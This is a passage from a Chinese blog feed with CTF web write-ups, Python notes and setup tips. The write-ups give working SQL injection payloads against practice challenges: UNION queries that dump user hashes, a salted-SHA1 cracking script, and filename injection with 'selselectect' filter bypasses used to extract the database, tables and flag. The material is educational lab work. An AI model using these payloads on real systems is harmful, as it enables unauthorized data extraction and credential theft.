class="built_in">+key</span><span class="meta">%2Cname</span>+varchar<span class="meta">%28255</span><span class="meta">%29</span><span class="meta">%2Cpassword</span>+varchar<span class="meta">%28255</span><span class="meta">%29</span><span class="meta">%2Chint</span>+varchar<span class="meta">%28255</span><span class="meta">%29</span><span class="meta">%29</span>;</span><br></pre></td></tr></table></figure><p>URL编码转换一下：%27=&gt;’;%28=&gt;(;%29=&gt;);</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">Users</span>(<span class="keyword">id</span> <span class="built_in">int</span> primary <span class="keyword">key</span>,<span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line"><span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">255</span>),hint <span class="built_in">varchar</span>(<span class="number">255</span>))</span><br></pre></td></tr></table></figure><p>看到Users表、id,name,password.hint字段；<br>构造查询语句：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line"><span class="attribute">usr</span>=<span class="string">'union select id,id from Users limit 0,1--&amp;pw=233</span></span><br><span class="line"><span class="string">usr='</span>union select id,id <span class="keyword">from</span><span class="built_in"> Users </span>limit 1,1--&amp;<span class="attribute">pw</span>=233</span><br><span class="line"><span class="attribute">usr</span>=<span class="string">'union select id,id from Users limit 2,1--&amp;pw=233</span></span><br><span class="line"><span class="string">得到3个id；</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usr='union <span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span> <span class="keyword">from</span> <span class="keyword">Users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span><span class="comment">--&amp;pw=233</span></span><br><span class="line">usr=<span class="string">'union select id,name from Users limit 1,1--&amp;pw=233</span></span><br><span class="line"><span class="string">usr='</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span> <span class="keyword">from</span> <span class="keyword">Users</span> <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span><span class="comment">--&amp;pw=233</span></span><br><span class="line">得到<span class="keyword">name</span>：<span class="keyword">admin</span>、fritze、hansi</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/12/18/Q7946H.png" alt="Q7946H.png"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">usr</span>=<span class="string">'union select id,password from Users limit 0,1--&amp;pw=233</span></span><br><span class="line"><span class="string">usr='</span>union select id,password <span class="keyword">from</span><span class="built_in"> Users </span>limit 1,1--&amp;<span class="attribute">pw</span>=233</span><br><span class="line"><span class="attribute">usr</span>=<span class="string">'union select id,password from Users limit 2,1--&amp;pw=233</span></span><br><span class="line"><span class="string">得到password：</span></span><br><span class="line"><span class="string">3fab54a50e770d830c0416df817567662a9dc85c</span></span><br><span class="line"><span class="string">54eae8935c90f467427f05e4ece82cf569f89507</span></span><br><span class="line"><span class="string">34b0bb7c304949f9ff2fc101eef0f048be10d3bd</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">usr='union <span class="keyword">select</span> <span class="keyword">id</span>,hint <span class="keyword">from</span> <span class="keyword">Users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span><span class="comment">--&amp;pw=233</span></span><br><span class="line">usr=<span class="string">'union select id,hint from Users limit 1,1--&amp;pw=233</span></span><br><span class="line"><span class="string">usr='</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">id</span>,hint <span class="keyword">from</span> <span class="keyword">Users</span> <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span><span class="comment">--&amp;pw=233</span></span><br><span class="line">得到hint：</span><br><span class="line">my+fav+word+<span class="keyword">in</span>+my+fav+paper%<span class="number">3</span>F%<span class="number">21</span></span><br><span class="line">my+love+<span class="keyword">is</span>%E2%<span class="number">80</span>%A6%<span class="number">3</span>F</span><br><span class="line">the+<span class="keyword">password</span>+<span class="keyword">is</span>+<span class="keyword">password</span></span><br></pre></td></tr></table></figure><p>根据admin用户的提示my fav word in my fav paper？！<br>应该是：密码+”Salz!”做sha1处理，密码应该就产生于pdf中；</p><p>因为我门知道了加密结果直接解密去掉Salz就得到密码了：<br><img src="https://s2.ax1x.com/2019/12/18/Q79onA.png" alt="Q79onA.png"><br><a href="https://www.somd5.com/" target="_blank" rel="noopener">解密</a></p><p>也可以用pdf中的单词进行+Salz!再做sha1；</p><p>借用一下别人的Python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cStringIO <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager, PDFPageInterpreter</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> TextConverter</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LAParams</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFPage</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pdf</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">"./"</span>) <span class="keyword">if</span> i.endswith(<span class="string">"pdf"</span>)]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_pdf_2_text</span><span class="params">(path)</span>:</span></span><br><span class="line">    rsrcmgr = PDFResourceManager()</span><br><span class="line">    retstr = StringIO()</span><br><span class="line">    device = TextConverter(rsrcmgr, retstr, codec=<span class="string">'utf-8'</span>, laparams=LAParams())</span><br><span class="line">    interpreter = PDFPageInterpreter(rsrcmgr, device)</span><br><span class="line">    <span class="keyword">with</span> open(path, <span class="string">'rb'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> PDFPage.get_pages(fp, set()):</span><br><span class="line">            interpreter.process_page(page)</span><br><span class="line">        text = retstr.getvalue()</span><br><span class="line">    device.close()</span><br><span class="line">    retstr.close()</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_password</span><span class="params">()</span>:</span></span><br><span class="line">pdf_path = get_pdf()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pdf_path:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Searching word in "</span> + i</span><br><span class="line">pdf_text = convert_pdf_2_text(i).split(<span class="string">" "</span>)</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> pdf_text:</span><br><span class="line">sha1_password = hashlib.sha1(word+<span class="string">"Salz!"</span>).hexdigest()</span><br><span class="line"><span class="keyword">if</span> sha1_password == <span class="string">'3fab54a50e770d830c0416df817567662a9dc85c'</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Find the password :"</span> + word</span><br><span class="line">exit()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">find_password()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">os.listdir() 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表。</span></span><br><span class="line"><span class="string">它不包括 . 和 .. 即使它在文件夹中。只支持在 Unix, Windows 下使用。</span></span><br><span class="line"><span class="string">语法</span></span><br><span class="line"><span class="string">listdir()方法语法格式如下：os.listdir(path)</span></span><br><span class="line"><span class="string">参数:path -- 需要列出的目录路径</span></span><br><span class="line"><span class="string">返回值:返回指定路径下的文件和文件夹列表。</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">endswith() 方法用于判断字符串是否以指定后缀结尾，如果以指定后缀结尾返回True，否则返回False。可选参数"start"与"end"为检索字符串的开始与结束位置。</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">hashlib是涉及安全散列和消息摘要，提供多个不同的加密算法接口，如SHA1、SHA224、SHA256、SHA384、SHA512、MD5等。</span></span><br><span class="line"><span class="string">其中</span></span><br><span class="line"><span class="string">hash.digest() </span></span><br><span class="line"><span class="string">返回摘要，作为二进制数据字符串值</span></span><br><span class="line"><span class="string">hash.hexdigest() </span></span><br><span class="line"><span class="string">返回摘要，作为十六进制数据字符串值</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>得到密码：ThinJerboa<br>访问：admin.php</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">username</span>=admin</span><br><span class="line"><span class="attr">password</span>=ThinJerboa</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://s2.ax1x.com/2019/12/18/Q795Xd.png" alt="Q795Xd.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;baby-web&quot;&gt;&lt;a href=&quot;#baby-web&quot; class=&quot;headerlink&quot; title=&quot;baby_web&quot;&gt;&lt;/a&gt;baby_web&lt;/h1&gt;&lt;p&gt;题目提示：想想初始页面是哪个&lt;br&gt;考虑到可能是页面302重定向&lt;br&gt;抓包得到flag&lt;b
      
    
    </summary>
    
      <category term="CTF" scheme="https://singlemindedt.github.io/categories/CTF/"/>
    
      <category term="攻防世界" scheme="https://singlemindedt.github.io/categories/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="Web" scheme="https://singlemindedt.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Python笔记1</title>
    <link href="https://singlemindedt.github.io/2019/12/16/Python%E7%AC%94%E8%AE%B01/"/>
    <id>https://singlemindedt.github.io/2019/12/16/Python笔记1/</id>
    <published>2019-12-16T14:47:15.000Z</published>
    <updated>2019-12-18T15:38:21.297Z</updated>
    
    <content type="html"><![CDATA[<h1 id="报误："><a href="#报误：" class="headerlink" title="报误："></a>报误：</h1><p>SyntaxError: unexpected EOF while parsing<br>一般是最后一行括号没补全，或者写了for循环没写循环体，因为解释器到底了度没找到它要找到的东西</p><h1 id="Python逻辑运算符"><a href="#Python逻辑运算符" class="headerlink" title="Python逻辑运算符"></a>Python逻辑运算符</h1><p>and or not<br>　　优先级：() &gt; not &gt; and &gt; or<br><a href="https://www.cnblogs.com/zhangyanran/p/9896070.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhangyanran/p/9896070.html</a></p><h1 id="Python-lower-方法"><a href="#Python-lower-方法" class="headerlink" title="Python lower() 方法"></a>Python lower() 方法</h1><p>转换字符串中所有大写字符为小写。<br>语法<br>lower()方法语法：str.lower()</p><h1 id="ord-函数"><a href="#ord-函数" class="headerlink" title="ord() 函数"></a>ord() 函数</h1><p>是 chr() 函数（对于8位的ASCII字符串）或 unichr() 函数（对于Unicode对象）的配对函数，<br>它以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值，或者 Unicode 数值，<br>如果所给的 Unicode 字符超出了你的 Python 定义范围，则会引发一个 TypeError 的异常。<br>语法<br>以下是 ord() 方法的语法:<br>ord(c)</p><h1 id="Python-join"><a href="#Python-join" class="headerlink" title="Python join()"></a>Python join()</h1><p>描述<br>Python join() 方法用于将序列中的元素以指定的字符连接生成一个新的字符串。</p><p>语法<br>join()方法语法：</p><p>str.join(sequence)</p><h1 id="Python-chr-函数"><a href="#Python-chr-函数" class="headerlink" title="Python chr() 函数"></a>Python chr() 函数</h1><p>描述<br>chr() 用一个范围在 range（256）内的（就是0～255）整数作参数，返回一个对应的字符。<br>语法<br>以下是 chr() 方法的语法:<br>chr(i)<br>参数<br>i – 可以是10进制也可以是16进制的形式的数字。</p><h1 id="Python-isalpha-方法"><a href="#Python-isalpha-方法" class="headerlink" title="Python isalpha() 方法"></a>Python isalpha() 方法</h1><p>检测字符串是否只由字母组成。</p><p>语法<br>isalpha()方法语法：</p><p>str.isalpha()</p><h1 id="raw-input"><a href="#raw-input" class="headerlink" title="raw_input"></a>raw_input</h1><p>input它会根据用户输入变换相应的类型,而且如果要输入字符和字符串的时候必须要用引号包起来,而raw_input则是不管用户输入什么类型的都会转变成字符型.</p><h1 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h1><p><a href="https://www.jianshu.com/p/15715d6f4dad" target="_blank" rel="noopener">https://www.jianshu.com/p/15715d6f4dad</a></p><h1 id="Python-int-函数"><a href="#Python-int-函数" class="headerlink" title="Python int() 函数"></a>Python int() 函数</h1><p>Python 内置函数 Python 内置函数<br>描述<br>int() 函数用于将一个字符串或数字转换为整型。<br>语法<br>以下是 int() 方法的语法:<br>class int(x, base=10)<br>参数<br>x – 字符串或数字。<br>base – 进制数，默认十进制。<br>返回值<br>返回整型数据。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;报误：&quot;&gt;&lt;a href=&quot;#报误：&quot; class=&quot;headerlink&quot; title=&quot;报误：&quot;&gt;&lt;/a&gt;报误：&lt;/h1&gt;&lt;p&gt;SyntaxError: unexpected EOF while parsing&lt;br&gt;一般是最后一行括号没补全，或者写了for循
      
    
    </summary>
    
      <category term="notes" scheme="https://singlemindedt.github.io/categories/notes/"/>
    
      <category term="Python" scheme="https://singlemindedt.github.io/categories/notes/Python/"/>
    
    
      <category term="Python" scheme="https://singlemindedt.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>upload</title>
    <link href="https://singlemindedt.github.io/2019/12/16/upload/"/>
    <id>https://singlemindedt.github.io/2019/12/16/upload/</id>
    <published>2019-12-16T00:14:47.000Z</published>
    <updated>2019-12-16T11:45:02.587Z</updated>
    
    <content type="html"><![CDATA[<h1 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h1><p>根据题目upload猜测可能为文件上传漏洞，先注册为会员(username:111111;password:111111);<br>登录就出现了上传文件的页面如下：<br><img src="https://s2.ax1x.com/2019/12/16/QhshQS.png" alt="QhshQS.png"><br>尝试上传文件，发现只有jpg格式的文件可以上传<br>尝试上传php.jpg</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>burpsuite抓包改后缀名为php得到结果回应为文件格式错误，应该是服务器端的检查，而非客户端Js过滤；</p><h1 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h1><p><strong>题目限制了上传文件的后缀名必须为jpg，但并没有对文件内容有所检查；</strong><br><strong>图片马的方法不可行，上传成功后并没有目录，同时无法上传.htaccess对图片马解析；</strong><br>参阅相关资料发现似乎是利用文件名注入，并且通过每次上传成功后的回显uid is ：1660 大概能够猜测应该是利用文件名对后端数据库进行注入；<br>*后端插入语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名</span><br><span class="line"><span class="keyword">VALUES</span>（被插入新行中的值）</span><br></pre></td></tr></table></figure><h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><p>构造payload：（文件名）</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(<span class="keyword">select</span> <span class="keyword">database</span>())+<span class="string">'.jpg</span></span><br></pre></td></tr></table></figure><p>可以看到select被过滤了，尝试双写绕过：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selselectect database())+'.jpg</span><br></pre></td></tr></table></figure><p>页面回显均为0；<br>尝试转换格式：<br>转为16进制：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selselectect hex(database()))+'.jpg</span><br></pre></td></tr></table></figure><p>页面回显为：7765625<br>分析(回显16进制为纯数字，可能过滤字母；且可能回显位不全)<br>转10进制输出:</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selselectect conv(hex(database()),<span class="number">16</span>,<span class="number">10</span>))+'.jpg</span><br></pre></td></tr></table></figure><p>*MySQL CONV（）将一个数字从一个数字基数系统转换为另一个数字基数系统。转换后，函数返回数字的字符串表示形式。<br>当定义的参数为NULL时，返回值将为NULL。<br>最小基数为2，最大基数为36.如果要转换的基数为负数，则该数字被视为带符号数。否则，它被视为未签名。<br>该函数出现在MySQL版本：<br>5.6语法：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="constructor">CONV(N,<span class="params">from_base</span>,<span class="params">to_base</span>)</span></span><br></pre></td></tr></table></figure><p>页面回显为：1.8446744073709552e19<br>分析(回显科学计数法，应该是输出位数过长)<br>使用substr分割输出：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selselectect conv(substr(hex(database()),<span class="number">1</span>,<span class="number">12</span>),<span class="number">16</span>,<span class="number">10</span>))+'.jpg</span><br></pre></td></tr></table></figure><p>页面回显为：131277325825392<br>转16进制再转为ascll,<br>得到：web_up</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeascll</span><span class="params">(number)</span>:</span></span><br><span class="line">    number=str(hex(number))[<span class="number">2</span>:]</span><br><span class="line">    s1=[number[i:(i+<span class="number">2</span>)]<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(number),<span class="number">2</span>)]</span><br><span class="line">    s2=[int(i,<span class="number">16</span>)<span class="keyword">for</span> i <span class="keyword">in</span> s1]</span><br><span class="line">    s3=[chr(i)<span class="keyword">for</span> i <span class="keyword">in</span> s2]</span><br><span class="line">    s=<span class="string">""</span>.join(s3)</span><br><span class="line">    print(s)</span><br><span class="line"></span><br><span class="line">changeascll(<span class="number">131277325825392</span>)</span><br></pre></td></tr></table></figure><p>提取后半部分字符：1819238756</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selselectect conv(substr(hex(database()),<span class="number">13</span>,<span class="number">12</span>),<span class="number">16</span>,<span class="number">10</span>))+'.jpg</span><br></pre></td></tr></table></figure><p>得到数据库名：web_upload</p><p>同样使用上述方法爆表<br>payload：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selecselectt conv(substr(hex((selecselectt table_name frofromm information_schema.tables where table_schema='web_upload' limit <span class="number">1</span>,<span class="number">1</span>)),<span class="number">1</span>,<span class="number">12</span>),<span class="number">16</span>,<span class="number">10</span>))+'.jpg</span><br></pre></td></tr></table></figure><p>114784820031327<br>112615676665705<br>126853610566245<br>得到表名：hello_flag_is_here<br>爆字段<br>payload:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selecselectt conv(substr(hex((selecselectt column_name frofromm information_schema.columns where table_name='</span>hello_flag_is_her<span class="string">e' limit 0,1)),1,12),16,10))+'</span>.jpg</span><br></pre></td></tr></table></figure><p>115858377367398<br>7102823<br>得到字段名：i_am_flag<br>爆值<br>payload：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selecselectt conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>,<span class="number">12</span>),<span class="number">16</span>,<span class="number">10</span>))+'.jpg</span><br></pre></td></tr></table></figure><p>36427215695199<br>92806431727430<br>560750951<br>得到值：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!_@<span class="keyword">m_Th</span>.<span class="keyword">e_F</span>!<span class="keyword">lag</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;初探&quot;&gt;&lt;a href=&quot;#初探&quot; class=&quot;headerlink&quot; title=&quot;初探&quot;&gt;&lt;/a&gt;初探&lt;/h1&gt;&lt;p&gt;根据题目upload猜测可能为文件上传漏洞，先注册为会员(username:111111;password:111111);&lt;br&gt;登录就出
      
    
    </summary>
    
      <category term="CTF" scheme="https://singlemindedt.github.io/categories/CTF/"/>
    
      <category term="攻防世界" scheme="https://singlemindedt.github.io/categories/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="Web" scheme="https://singlemindedt.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>安装PyCharm</title>
    <link href="https://singlemindedt.github.io/2019/12/13/%E5%AE%89%E8%A3%85PyCharm/"/>
    <id>https://singlemindedt.github.io/2019/12/13/安装PyCharm/</id>
    <published>2019-12-13T00:47:41.000Z</published>
    <updated>2019-12-13T04:52:54.257Z</updated>
    
    <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因^-^"></a>起因^-^</h1><p>原来用的IDLE，功能很少，就来安装了PyCharm；<br>很简单的安装，一步步坐下来就好；<br>由于之前用IDLE都是在安装路径下运行的，故没有配置环境变量；方便起见配一下；<br>控制面板-系统-高级系统设置-环境变量-系统变量-Path-添加路径；</p><h1 id="经过orz"><a href="#经过orz" class="headerlink" title="经过orz"></a>经过orz</h1><h2 id="安装Python"><a href="#安装Python" class="headerlink" title="安装Python"></a>安装Python</h2><p>自己在python -v/V上凌乱了，以为是之前安装的一些东西搞坏了，还是重装了QAQ；<br>安装python：<a href="https://baijiahao.baidu.com/s?id=1606573927720991570&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">https://baijiahao.baidu.com/s?id=1606573927720991570&amp;wfr=spider&amp;for=pc</a><br>检查环境变量的时候会发现，添加在了用户变量并且添加了两个：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E:<span class="tag">\<span class="name">newpython</span></span>3.8.0<span class="tag">\<span class="name">install</span></span>_location<span class="tag">\<span class="name">Scripts</span></span><span class="tag">\</span></span><br><span class="line">E:<span class="tag">\<span class="name">newpython</span></span>3.8.0<span class="tag">\<span class="name">install</span></span>_location<span class="tag">\</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*系统变量：对所有的用户起作用</span><br><span class="line">*用户变量：对当前用户起作用</span><br></pre></td></tr></table></figure><p>powershell中执行python -V   —查看版本(注意是大写V，小写v会抛出很多东西)；</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -v 小写v:这是版本信息，包括库版本</span><br><span class="line">python -V 大写v：只看python的版本</span><br></pre></td></tr></table></figure><p><em>(记录一下，未删去原来的版本3.7.4；怕原来配置的一些东西又用不了了)</em></p><h2 id="安装PyCharm"><a href="#安装PyCharm" class="headerlink" title="安装PyCharm"></a>安装PyCharm</h2><p>一路傻瓜操作；</p><h3 id="进入软件："><a href="#进入软件：" class="headerlink" title="进入软件："></a>进入软件：</h3><p>1.Create New Project<br><img src="https://s2.ax1x.com/2019/12/13/QgSu5V.png" alt="QgSu5V.png"><br>Location(存放工程路径),可自行修改，但是最好为空；<br>点击▶project…<br>能看到PyCharm已经获取了3.8.0解释器Base interpreter:路径…python.exe<br>Create<br>2.等，Tip-&gt;Close<br>添加Project Interpreter<br>File<br>settings<br><img src="https://s2.ax1x.com/2019/12/13/QgSnU0.png" alt="QgSnU0.png"><br>OK</p><p>3.试运行<br>File<br>new<br>Python File<br>输入name ok<br>编写程序<br>运行<br><img src="https://s2.ax1x.com/2019/12/13/QgSQ8U.png" alt="QgSQ8U.png"></p><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p>？？？</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因^-^&quot;&gt;&lt;/a&gt;起因^-^&lt;/h1&gt;&lt;p&gt;原来用的IDLE，功能很少，就来安装了PyCharm；&lt;br&gt;很简单的安装，一步步坐下来就好；&lt;br&gt;由于之前用IDLE都是在安
      
    
    </summary>
    
    
      <category term="环境安装" scheme="https://singlemindedt.github.io/tags/%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/"/>
    
  </entry>
  
  <entry>
    <title>cmd下输入python弹出应用商店</title>
    <link href="https://singlemindedt.github.io/2019/12/13/cmd%E4%B8%8B%E8%BE%93%E5%85%A5python%E5%BC%B9%E5%87%BA%E5%BA%94%E7%94%A8%E5%95%86%E5%BA%97/"/>
    <id>https://singlemindedt.github.io/2019/12/13/cmd下输入python弹出应用商店/</id>
    <published>2019-12-12T16:57:32.000Z</published>
    <updated>2019-12-13T04:56:49.241Z</updated>
    
    <content type="html"><![CDATA[<p>问题：cmd/powershall下运行python均弹窗应用商店<br>解决：在环境变量中可以看到第一条为：%USERPROFILE%\AppData\Local\Microsoft\WindowsApps<br><em>%USERPROFILE% : 当前用户配置文件(Profile文件)位置</em><br>备份后删除，解决！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;问题：cmd/powershall下运行python均弹窗应用商店&lt;br&gt;解决：在环境变量中可以看到第一条为：%USERPROFILE%\AppData\Local\Microsoft\WindowsApps&lt;br&gt;&lt;em&gt;%USERPROFILE% : 当前用户配置文件(
      
    
    </summary>
    
    
      <category term="环境变量" scheme="https://singlemindedt.github.io/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"/>
    
  </entry>
  
  <entry>
    <title>密码学复习</title>
    <link href="https://singlemindedt.github.io/2019/12/12/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0/"/>
    <id>https://singlemindedt.github.io/2019/12/12/密码学复习/</id>
    <published>2019-12-12T07:56:05.000Z</published>
    <updated>2019-12-13T05:11:47.920Z</updated>
    
